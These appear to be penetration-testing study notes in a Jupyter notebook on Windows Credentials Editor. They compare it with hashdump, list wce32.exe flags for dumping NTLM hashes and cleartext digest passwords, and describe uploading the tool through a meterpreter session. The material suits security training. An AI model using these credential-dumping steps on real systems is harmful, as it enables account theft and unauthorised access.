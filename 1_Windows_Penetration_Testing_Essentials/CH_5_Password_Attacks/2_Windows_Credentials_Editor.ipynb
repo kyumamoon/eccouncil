{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# **Windows Credentials Editor**\n",
    "\n",
    "- WIN Credential Editor vs Hashdump\n",
    "    - WIN CE: dumps hash from memory of users who are logged on\n",
    "    - Hashdump: dumps hash of all users."
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- Kali has WCE installed.\n",
    "    - ls -al /usr/share/windows-resources/wce \n",
    "    - Get WCE executable onto target system and execute it using shell.\n",
    "        - wce32.exe\n",
    "        - wce32.exe -h\n",
    "            - help menu\n",
    "        - wce32.exe -l\n",
    "            - dump NTLM password hashes\n",
    "        - wce32.exe -w\n",
    "            - dump cleartext passwords stored by digest authentication package"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**Uploading wce32.exe onto target.**\n",
    "- in meterpreter session\n",
    "    - upload \\<exePath\\>"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
